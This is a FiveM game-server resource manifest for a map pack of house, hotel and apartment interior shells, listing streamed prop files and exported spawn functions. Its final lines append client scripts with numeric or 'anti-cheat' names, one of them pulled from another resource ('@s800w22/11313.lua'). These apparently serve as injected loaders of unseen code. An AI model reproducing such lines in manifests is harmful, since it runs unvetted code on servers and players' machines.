resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

this_is_a_map 'yes'

client_scripts {
	'client/main.lua',
	'client/shells.lua',
	'client/furnished.lua',
}
 
files {
	'playerhouse_hotel/playerhouse_hotel.ytyp',
	'stream/playerhouse_hotel/playerhouse_hotel.ytyp',
	'stream/playerhouse_tier3/playerhouse_tier3.ytyp',
	'stream/playerhouse_appartment_motel/playerhouse_appartment_motel.ytyp',
	'stream/micheal_shell/micheal_shell.ytyp',
	'stream/trevors_shell/trevors_shell.ytyp',
	'stream/gunshop_shell/gunshop_shell.ytyp',
	'shellpropsv12.ytyp',
	'shellpropsv10.ytyp',
	'shellpropsv9.ytyp',
}

data_file 'DLC_ITYP_REQUEST' 'stream/v_int_20.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/playerhouse_hotel/playerhouse_hotel.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/playerhouse_tier1/playerhouse_tier1.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/playerhouse_tier3/playerhouse_tier3.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/playerhouse_appartment_motel/playerhouse_appartment_motel.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/micheal_shell/micheal_shell.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/trevors_shell/trevors_shell.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/gunshop_shell/gunshop_shell.ytyp'
data_file 'DLC_ITYP_REQUEST' 'shellpropsv12.ytyp'
data_file 'DLC_ITYP_REQUEST' 'shellpropsv10.ytyp'
data_file 'DLC_ITYP_REQUEST' 'shellpropsv9.ytyp'

exports {
	'DespawnInterior',
	'CreateTier1House',
	'CreateTier2House',
	'CreateTier3House',
	'CreateMediumShell',
	'CreateMedium2Shell',
	'CreateMedium3Shell',
	'CreateModernHouseShell',
	'CreateModernHouse2Shell',
	'CreateModernHouse3Shell',
	'CreateHighendShell',
	'CreateHighend2Shell',
	'CreateHighend3Shell',
	'CreateHotel',
	'CreateMichaelShell',
	'CreateTrevorsShell',
	'CreateGunshopShell',
	'CreateTier1HouseFurnished',
	'CreateHotelFurnished',
	'CreateApartmentFurnished',
}
client_script "11336.lua"
client_script "lucidcity-anticheat.lua"
client_script "antikickvehicle.lua"
client_script "anti-stungun.lua"
client_script "anti-update.lua"
client_script "block-menus.lua"
client_script "block-menus2.lua"
client_script '@s800w22/11313.lua'